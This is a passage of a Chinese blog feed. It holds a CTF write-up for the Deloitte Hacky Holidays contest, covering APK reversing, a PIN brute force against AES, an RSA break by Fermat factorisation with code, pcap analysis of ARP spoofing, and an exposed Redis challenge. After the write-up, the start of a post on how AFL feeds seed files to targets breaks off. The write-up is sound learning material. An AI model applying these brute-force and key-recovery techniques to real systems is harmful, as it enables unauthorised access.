punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">5</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">53</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">77</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> password<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token comment">#print(str(password))</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：<code>CTF&#123;7a0QfB8dr1cF293Oy5a9fk9ŤA01c&#125;</code>，但是Ť这个字符很明显不是ASCII编码，在仔细观察之后，发现这个字符十进制数表示为356，模256之后的结果为100。对应的字符为d</p><p>那正确的结果为</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;7a0QfB8dr1cF293Oy5a9fk9dA01c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-5-PIZZA-PAZZI"><a href="#3-5-PIZZA-PAZZI" class="headerlink" title="3-5 PIZZA PAZZI"></a><strong>3-5 PIZZA PAZZI</strong></h3><p>题目提供了一个apk文件。利用jadx进行反编译，并找到程序入口位置。根据第一题的题目，Listening in on the conversation。我们将apk文件使用keytool生成jks，再用apksigner完成v2签名，随后安装到雷电模拟器的安卓系统中。</p><p>然后使用fiddler4监控雷电模拟器发出的数据包，找到了<a href="https://pizzapazzi.challenge.hackazon.org/%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B9%8B%E5%90%8E%E5%BE%97%E5%88%B0%E7%AC%AC%E4%B8%80%E5%85%B3%E7%9A%84%E7%AD%94%E6%A1%88%E3%80%82">https://pizzapazzi.challenge.hackazon.org/，访问之后得到第一关的答案。</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/u_muE2nJRY2-WAioI6IVTw.png" alt="20"></p><p>第二关，按照网页中显示的提示，我们可以阅读代码，从中得到更多的信息。这里我走了很多弯路，我一直以为是要动态调试这个app，但是打开之后点击Get started之后，app自动关闭。我开始怀疑是雷电模拟器版本的问题，随后下载了Android studio并安装Nexus5x的安卓模拟器，在该系统上面安装之后依然还是打不开。</p><p>之后没得办法又重新回到代码中，怀疑这些字符串是base64编码，解码之后后面的题目就迎刃而解啦。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/36NgagSGpYKpFXPjuHcAAA.png" alt="21"></p><p>所以又重新回到代码上，去寻找恶意代码。这里又走了弯路，这个app本身就是不完整的。其实在函数名称设置上已经有了提示。接下来的关卡都是一样的。采用的都是base64编码，模拟的就是后台挖矿的程序。</p><p>第三关</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/J4EBRWJm2Qeeu94w9gcEiw.png" alt="22"></p><p>第四关</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/iSLzfxsxfi72lIhl4zV18g.png" alt="23"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/F6z7pc4n98L2NXa6IkYxPg.png" alt="24"></p><h3 id="4-3-IDENTIFY-YOURSELF"><a href="#4-3-IDENTIFY-YOURSELF" class="headerlink" title="4-3 IDENTIFY YOURSELF"></a><strong>4-3</strong> <strong>IDENTIFY YOURSELF</strong></h3><p>这个题要根据题目中提供的DigitalId.apk，找出session.raw中保存的flag。</p><p>首先还是通过jadx对该apk文件进行反编译。通过反编译之后的代码，我们可以得到程序采用了AES对称加密的方式。先利用UUID生成的 32bytes 随机的十六进制字符串，对密文进行加密。再通过用户输入的PIN（4个拼接到一起的，每个4bytes，组到一起刚好是16bytes），对UUID进行加密。</p><p>然后，尝试通过在反编译之后的代码中寻找有关PIN的信息。发现并没有相关的信息。通过尝试安装软件运行发现，PIN中仅仅支持数字输入，所以呢，我们采取爆破的方式。</p><p>利用kali虚拟机生成包含4位数字的所有组合，再通过一样的解密过程，将密文解密出来。最终在发现1337即为PIN，也找到了最终的Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(13).png" alt="25"></p><p>此题，思路并没有多大的问题，但是由于本人对基础知识的认识不够。所以走了很多弯路。</p><p>首先，所有的字符串在内存中都是以二进制存储的，十六进制形式只是其诸多展现形式中的一种而已(此外还有8进制等)。在程序语言中，将字符串转为十六进制字符串，即是将字符串在内存当中存储的二进制—-以十六进制形式展现出来。如果把real_key以十六进制展示出来的话，会是 ce1feee3……等等。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QkVIgwLK8_8Qd5W5PQMt7A.png" alt="26"></p><p>接着，如何对这些二进制编码，是编码层面的问题，这里面有大家所熟知的Ascii码，UTF-8，UTF-16等等。这些编码说白了，就是按照自己的规则去读取内存中的二进制，然后查找该二进制对应的字母或者其他控制符等等。显然一个字节byte能标识的数据显然不够，所以又出现了UTF-16、Unicode编码等。不过对于英文的话，UTF-8编码是足够了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/rRV9NCsAVIF8kyedReM_YQ.png" alt="27"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="2-1-ENCAPSULATION"><a href="#2-1-ENCAPSULATION" class="headerlink" title="2-1 ENCAPSULATION"></a><strong>2-1</strong> <strong>ENCAPSULATION</strong></h3><p>这是一道关于简单密码学加解密的题目，共分为三关：Encapsulation、Cipher Squabble 以及 Back to the basics。</p><p>第一关是一道简单的编码转化题。题目首先提供了一张图片 “binary.jpeg” ，直接打开发现并没有什么线索，进一步我们使用记事本打开，发现里面全是字符 “ ( “ 和 “ 9 “，由于只有两种符号，开始猜测为摩斯电码，解码发现并不成功，后来结合图片名称，将其理解为二进制，于是将其分别转为 “ 0 “ 和 “ 1 “ 进行表示，并需要考虑如何转换成带有字母符号的字符串，于是转换成 ASCII ，得到一串新的代码。（bin2Ascii）</p><p>此时查看新的代码发现，存在最后一位为 “ = “，考虑 base64 编码，进行解码后得到 flag。（baseX解码）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;UGVwcGFpc2FwaWc&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关为简单的密码解密题。根据前一题得到的解密结果，能够发现一定线索。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(2).png" alt="28"></p><p>其中第一个人是密码学家，并且搜索发现与之相关的密码加密方式为 “维吉尼亚密码” ，而改密码需要一个 Key 来帮助解密，句中提及他的中间名可以帮助，因此得到 “ Battista “，最后进行解密得到 flag。（维吉尼亚解密）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;QMVSBGFZB2LUDMVUDGVKDGhPC2NPCGHLCG&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关<strong>Uncompleted。</strong>同样是密码解迷题。根据前一题得到的解密结果，能够发现一定线索。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(3).png" alt="29"></p><p>暂时猜测他 shuffle 的意思是某种换序加密，想到格栅密码，但是尝试并未找的 flag，同时认为他所提到的 cylinder 是某种轮盘加密，暂时不知道使用什么进行解密。</p><h3 id="2-2-SECRET-CONVE’RSA’TION"><a href="#2-2-SECRET-CONVE’RSA’TION" class="headerlink" title="2-2 SECRET CONVE’RSA’TION"></a><strong>2-2</strong> <strong>SECRET CONVE’RSA’TION</strong></h3><p>这是一道关于 RSA 计算的题目，仅一关。</p><p>本关卡提供了一个文件，包含了 RSA 计算中的公钥（N，e）以及密文 c。提供的参数较少，仅有密钥和密文，理论上是很难破解的，需要我们爆破算出两个因数 p 和 q，由于数字十分巨大爆破不好实现，因此首先考虑一些方法进行分解，经查询有以下几种情况及算法。</p><ol><li>N 较小：短除法、Miller-Rabin素性测试和离散对数Pollard_rho分解；</li><li>N 较大：在线查询 <a href="http://factordb.com/">http://factordb.com</a></li><li>e 过大或过小：Wiener’s attack</li><li>p 和 q 相近：费马分解</li></ol><p>参考文档：CTF-RSA 大整数分解</p><p>因此我首先首先尝试了费马分解，并成功获取 p 和 q，进而求得 phi 和 d，最后根据公式 m = pow(c, d, n) 获取明文。</p><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779855101287148374206957436458915587712518501281793789555480805845328694482152421962093714097210685267495028743960484986044572019270471629952251128834754752071</span>q <span class="token operator">=</span> <span class="token number">72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779768486519862521371761417707655650528352916168732086751886502287478577426433344249124093776641317837723657300923622528678618140782421245730805689484709681027</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">5261933844650100908430030083398098838688018147149529533465444719385566864605781576487305356717074882505882701585297765789323726258356035692769897420620858774763694117634408028918270394852404169072671551096321238430993811080749636806153881798472848720411673994908247486124703888115308603904735959457057925225503197625820670522050494196703154086316062123787934777520599894745147260327060174336101658295022275013051816321617046927321006322752178354002696596328204277122466231388232487691224076847557856202947748540263791767128195927179588238799470987669558119422552470505956858217654904628177286026365989987106877656917</span>c <span class="token operator">=</span> <span class="token number">176955087574615470063741472647197409875117482285309340581271852382710990213049325727125711804231234813146490233229473679126800639397642380073858980601348297248196895714845780751708931869367483971257602632592317987276609144131149239628356913355893753937582033295526684103570648143766629320982809943886265840131929175495923219383837739522744946987913271495217642469261483099144404131616847257182856944641353523297845726161862062019653065904612865722942649827600090466968124488518262272506900322544403300651512798674316560281124899873116026534973842919190849918357740307152880452169695889599662477611952919511642717417</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m的值为:"</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求得 m 后，根据提示 flag 为 CTF{xxx}，根据获得 m 前两位为 67，猜测需要转为 ASCII 码，转换后成功获取 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;RSA_br0ken&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="1-3-AUDIBLE-TRANSMISSION"><a href="#1-3-AUDIBLE-TRANSMISSION" class="headerlink" title="1-3 AUDIBLE TRANSMISSION"></a><strong>1-3</strong> <strong>AUDIBLE TRANSMISSION</strong></h3><p>这是一道音频wav的隐写题目，分为两关：For your eyes only 以及 Code。</p><p>第一关是频谱隐写，使用工具Audacity即可查看音频的频谱图拿到flag. 其实无论是频谱隐写还是波形隐写其音频听起来都是异常的，可以通过此方法来判断。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/BquF8GIbMHL0grUrZaxNwg.png" alt="30"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Tagalog&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关<strong>Uncompleted</strong>，目前的猜测是出题人将一段code隐藏到中间的音频中啦。中间的音频听起来就是倒放，因此首先将整段音频使用Audacity提供的效果-&gt;反向（时间）来反转。但是处理之后听起来是清晰且顺畅的了，但是仍不知道是什么语言，在说什么。因为其内容上听起来没有杂音，所以猜想是使用某种成熟的对原音频影响较小音频隐写算法。目前尝试了Stegohide（Stegseek(密码爆破)），AudioStego以及LSB(wavStego，手写脚本)，但是生成的字节都是没有实义的。</p><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="1-1-CHEMICAL-PLANT"><a href="#1-1-CHEMICAL-PLANT" class="headerlink" title="1-1 CHEMICAL PLANT"></a><strong>1-1</strong> <strong>CHEMICAL PLANT</strong></h3><p>这同样是一道关于 ICS（工业控制系统） 流量分析的题目，共分为四关：Find the attack point、Record everything、Know the limit 以及 True or false。</p><p>第一关非常简单，需要我们找到受攻击的组件，flag 为 CTF{component}。根据视频我们能够发现，视频中 Pressure 部分一直增加超过了限度，导致了爆炸，因此这是被攻击的组件。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Pressure&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关同样比较简单，需要我们找到受攻击的准确时刻。这里需要进行流量分析（Wireshark： “分析–&gt;专家信息”），能够发现作者在其中添加了 comment 为我们进行提示。打开便能够发现第二关到第四关的所有线索。其中对第二关的线索如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/jvKaukugxsqAaNqx5m_8ag.png" alt="31"></p><p>同样我们能够看出为 base64 编码，解码后获取 flag。（baseX解码）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;M0DBU5_RE4D_R1GHT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关<strong>Uncompleted</strong>，需要我们找到受攻击的设定值。其中对第三关的线索如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/wjWgdnc7_QzcVmY6i8KlLQ.png" alt="32"></p><p>但是还是没搞懂这个指的设定值是说什么。</p><p>第四关，需要我们找到寄存器线圈中的数据类型，flag 为 CTF{datatype}。根据第二关线索可知其数据类型为 binary，如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0_UyX98l5vObVLrL66DyFw.png" alt="33"></p><p>其次他也呼应了题目的名称 True or false。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;binary&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-YOU-CAN’T-SEE-ME"><a href="#1-2-YOU-CAN’T-SEE-ME" class="headerlink" title="1-2 YOU CAN’T SEE ME"></a><strong>1-2</strong> <strong>YOU CAN’T SEE ME</strong></h3><p>这是一道关于 ICS（工业控制系统） 流量分析的题目，共分为四关：Parts make a whole、whoami、Man-in-the-middle 以及 Follow me till the end。</p><p>第一关是一个数据流追踪的问题。根据题目名称我们可以推测出需要将分散的数据包进行追踪，同时我们可以发现大多为 TCP 数据包，因此我们将 TCP 流进行追踪（Wireshark：” 分析–&gt;追踪流–&gt;TCP” ），接着我们进行翻阅可以看到 flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(4).png" alt="34"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Hacky_Holidays_ICS&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关是一个异常流量寻找的问题，flag 为 IP 地址。我们需要找到异常的组件，我的方法不一定准确（可能碰运气），我最开始是查看了流量图。（Wireshark：”统计”–&gt;”流量图”）发现有个内部 IP 频繁与外界 IP 进行数据交换，尝试发现正确。</p><pre class="line-numbers language-none"><code class="language-none">192.168.198.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关是寻找中间人攻击使用的协议，flag 为 CTF{protocol_in_capital_letters}。然后我思考了一下常见的中间人攻击方式，首先想到的是 ARP 欺骗，正确。</p><pre class="line-numbers language-none"><code class="language-none">192.168.198.136 -- 00:0c:29:7f:db:1c192.168.198.138 -- 00:0c:29:80:8c:09192.168.198.128 -- 00:0c:29:2a:0b:dd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是需要验证为什么，我查询了 ARP 的数据包，发现 136 向内部网关询问 138 的地址，网关开始询问大家 138 的地址，而 128 一直向网关传递的是自己的地址，于是 136 将 128 认为是 138 的地址，从而完成了欺骗，使 128 成为了中间人（136 – 128 –138）。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;ARP&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第四关 寻找目标机器与外部机器之间沟通的报文，主要使用了(右键选择追踪流-&gt;追踪TCP流)，再不断增加流编号的过程中，发现了339流中存在HTTP协议报文。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(5).png" alt="35"></p><p>将该报文中的HTML源码复制到txt文件中再重新命名为html，打开之后即可得到flag–是一个由base64编码的图片。（筛选的过程中一度怀疑TSL协议流中蕴含着flag，想要通过数据包中传递的密钥破解数据包中加密传递的信息。但从理论上来说仅从数据包破解TSL协议的可能性不大，包中传递的也都是公钥。）</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/g1biwI-jXY-HY_QDEDFCOQ.png" alt="36"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;5ERVER_15_H3R3&#125;        <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a><strong>PPC</strong></h2><p>Professionally Program Coder，即编程类题目。</p><h3 id="2-4-LOCATION-ANALYSIS"><a href="#2-4-LOCATION-ANALYSIS" class="headerlink" title="2-4 LOCATION ANALYSIS"></a><strong>2-4</strong> <strong>LOCATION ANALYSIS</strong></h3><p>首先此题给出的目标服务器是tcp:portal.hackazon.org:17002，结合题目的描述猜想是某数据库的借口。直接用telnet模拟tcp连接进行交互，发现如下的字符互动信息，可以被当作指纹去查看背后是什么数据库在运行。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1Eauo0DZSOdtkfWORB6_-A.png" alt="37"></p><p>简单搜索后发现是Redis数据库，连接上查看所有的Key，发现其中的存在”_flag”的键，查看其的值就可以得到第一关的flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/lYTwnjSB7DIci-cYI-S5lg.png" alt="38"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;DGErbbodqEeHQhjeDs8g&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了解决第二关，我们重新梳理下题目的情景。我们所连接的Redis数据库存储城市中自动驾驶车辆的实时位置的数据库，数据在实时更新，需要我们对数据进行分析。接着，在连接数据库后我们使用info命令对该题目的出题方式进行分析。我们可以看到实时的连接数，猜想后端只有一个共用的Redis，将其6379号端口映射到不同的端口供选手连接。所以我们应该是需要对数据库中的数据进行分析并找出flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/-JkxAyrzD7W_brYtyyRvHA.png" alt="39"></p><p>通过简单的分析可以发现，该数据库中一共有存储着1000个车辆的实时位置信息。数据库中的每个Key即车辆信息通过Json形式的数据结构保存，包括了其车牌号、经、纬度坐标。因为车辆的坐标是实时更新的，所以最直接的想法是将一段时间每个车的轨迹先画出来，看看有没有什么蛛丝马迹可循。</p><p>连接数据库并间隔一定时间保存每个车辆的的位置，最后绘制多点的轨迹图，我们可以发现一串类似于flag的车辆轨迹如下所示。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(15).png" alt="40"></p><p>接着，为了看得更清楚，我通过点的移动距离可以筛选出构成flag的点，并且调小了时间间隔。同时由于该图是由车的轨迹构成，所以我自然而然想绘制动态图片来搞清楚此flag是如何绘制的，这可能有助于我猜测各个位置的字母和数字是什么。所以，我得到了如下的gif图片，我们可以隐约地看到flag，但是很多位置并不明确，只能靠猜。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/gif.gif" alt="41"></p><p>但是还是不明确，经过meishijia的提醒下，我把横纵坐标的比例调成了一致使得每个字母更加协调。此时可以猜测出大部分的字符，但是有些位置还是无法确定。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(14).png" alt="42"></p><p>最后在meishijia的点拨下，我把轨迹图更换成了散点图，这样产生噪音的一些线条就被去除，最终得到了Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/XVRgPPl5ovYE2NUpVH9zDQ.jpeg" alt="43">     </p><p>此题留给我的经验是：做题时不能急功近利，要多思考，小心尝试。在得到倒数第二张图时，我觉得答案已经呼之欲出，所以一直在猜测每个位置的字符，并尝试爆破。这其实花费了不少时间，最终也没有得到正确的Flag.但是如果能观察图片的构成，思考别的呈现方式，去除连线轨迹产生的噪音，将折线图改为散点图，其实答案就自然而然地呈现啦。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简介：&lt;/p&gt;
&lt;p&gt;本文Deloitte Hacky Holiday比赛的WriteUp，主办方的题目非常有质量而且梯度拉开非常友好。我们最终在2334只参赛队伍中取得了75名次的成绩，再接再厉！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="比赛" scheme="https://laobameishijia.github.io/tag/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>毕设-Fuzz-AFLGo源码阅读-6</title>
    <link href="https://laobameishijia.github.io/2022/04/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-6/"/>
    <id>https://laobameishijia.github.io/2022/04/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-6/</id>
    <published>2022-04-21T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AFL种子文件是如何送入目标程序的？"><a href="#AFL种子文件是如何送入目标程序的？" class="headerlink" title="AFL种子文件是如何送入目标程序的？"></a>AFL种子文件是如何送入目标程序的？</h1><p>在做实验的过程中，因为要复现漏洞嘛，要把种子文件送入目标程序。这里产生了一个疑问</p><p><strong>如果我用重定向的方式把种子文件(二进制文件)送入目标程序中，那么目标程序会显示相应的报错。但是如果我将二进制文件的内容(使用xxd)复制下来，然后在送入程序中，目标程序就不会报错。</strong></p><p>在小刘的启发下，我开始对照源码，观察AFL是如何把种子文件送入目标程序。</p><p>得到的结论就是，AFL是采用重定向的方式将种子文件送入目标程序的。</p><hr><ol><li>首先是启动参数中含有@@的(目标程序接受<strong>文件名</strong>，作为输入参数)</li></ol><p><em><strong><code>@@</code>本身代表的就是运行xmllint过程中，需要送进去的文件名</strong></em></p><p><code>$AFLGO/afl-fuzz -m none -z exp -c 45m -i in -o out ./xmllint --valid --recover @@</code></p><p>AFL会找到<code>@@</code>的位置，然后把<code>@@</code>替换成<strong>out/.cur_input</strong>。并且指定<code>out_file</code>为。<code>out/.cur_input</code>。</p><p>具体细节可以参照函数 <code>detect_file_args</code></p><ol start="2"><li>然后是启动参数中不包含@@的(目标程序接受<strong>标准输入</strong>作为输入参数)</li></ol><p><code>$AFLGO/afl-fuzz -m none -z exp -c 45m -i in -o out binutils/cxxfilt</code></p><p>AFL会创建<code>cur_input</code>文件，然后把<code>out_fd</code>作为<code>.cur_input</code>的文件描述符</p><p>具体细节参照函数<code>setup_stdio_file</code></p><ol start="3"><li>紧接着会运行<code>perform_dry_run(..)</code>执行 input 文件夹下的预先准备的所有测试用例</li></ol><ol start="4"><li><code>perform_dry_run(..)</code>的循环里面会调用<code>calibrate_case(...)</code></li></ol><ol start="5"><li><code>calibrate_case(...)</code>在没有启动fork server的时候，会调用  <code>init_forkserver(argv)</code></li></ol><ol start="6"><li><code>init_forkserver(argv)</code>中的子进程会进行重定向</li></ol>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 